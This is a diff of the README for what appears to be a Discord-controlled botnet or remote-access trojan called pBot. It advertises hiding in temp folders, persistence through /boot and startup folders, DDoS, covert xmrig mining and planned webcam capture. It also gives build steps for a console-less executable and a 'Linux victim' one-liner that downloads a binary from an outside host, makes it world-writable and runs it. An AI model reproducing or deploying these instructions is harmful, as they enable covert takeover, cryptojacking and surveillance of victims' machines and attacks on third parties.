@@ -8,19 +8,6 @@ me: batu.sh#9675
 
 bnt: @udbnt
 
-# Features
-* Hidden (Works in /tmp, %temp%)
-* Persistence (Copying to /boot, shell:startup)
-* Supports Linux and Windows platforms
-* DDoS attack uses "storm" script
-* Mining uses "xmrig"
-
-# Soon
-* Web automation to provide bots
-* Discord botot status Examle= bots: 100
-* !webcampic
-* ?
-
 # Bot Commands
 
 * !sessions                              (List open sessions)
@@ -42,9 +29,23 @@ bnt: @udbnt
 * !upload.< HOSTNAME >@< IP > < PATH >           (Upload file to bot)
 * !nmap.< HOSTNAME >@< IP >                      (Nmap vuln scan)
 
-# Installation & Build
+# Features
+* Hidden (Works in /tmp, %temp%)
+* Persistence (Copying to /boot, shell:startup)
+* Supports Linux and Windows platforms
+* DDoS attack uses "storm" script
+* Mining uses "xmrig"
+
+# Soon
+* Web automation to provide bots
+* Discord botot status Examle= bots: 100
+* !webcampic
+* ?
+
+# Installation and Build (It will be enough to edit the token and channel id on Client.py)
+git clone https://github.com/rxu7s/pBot.git
+cd pBot
 pyinstaller --onefile --noconsole Client.py
-- After build complete look at this path : dist\Client
 
 # Linux victim
 cd /boot; apt-get update -y; apt-get install curl -y; [ -f "Client" ] && rm Client; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; ./Client
